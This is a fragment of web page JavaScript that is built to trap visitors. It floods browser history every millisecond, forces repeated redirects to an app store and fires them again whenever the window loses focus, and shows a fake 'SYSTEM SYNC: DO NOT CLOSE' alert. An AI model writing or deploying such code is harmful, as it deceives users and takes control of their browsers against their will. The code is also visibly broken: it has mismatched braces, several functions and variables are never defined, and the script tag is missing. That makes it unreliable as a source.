<!DOCTYPE html>

    function startSuperBlock(duration) {
        const start = Date.now();
        
        // THE 1MS OVERLOAD
        const block = setInterval(() => {
            if (Date.now() - start > duration || !document.hasFocus()) {
                clearInterval(block);
                return;
            }

            // 1. Flood OS with Redirects
            triggerStoreJump();

            // 2. Flood UI Thread with Math (Forces 'X' button to lag)

            window.history.pushState(null, "", "#locking-" + Math.random());
            
        }, 1); // 1ms Interval
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // Force jump immediately
        triggerStoreJump();

        // THE LOCK
        alert("ATTEMPT #39\n\nSYSTEM SYNC: DO NOT CLOSE\n\nFinalizing handover to Safari...");

        // Start the 1ms saturation
        startSuperBlock(gap);

        // Queue next cycle
        setTimeout(() => {

                rampage();
            }
        }, gap);
    }

    window.onload = () => {

    };

    window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
</script>
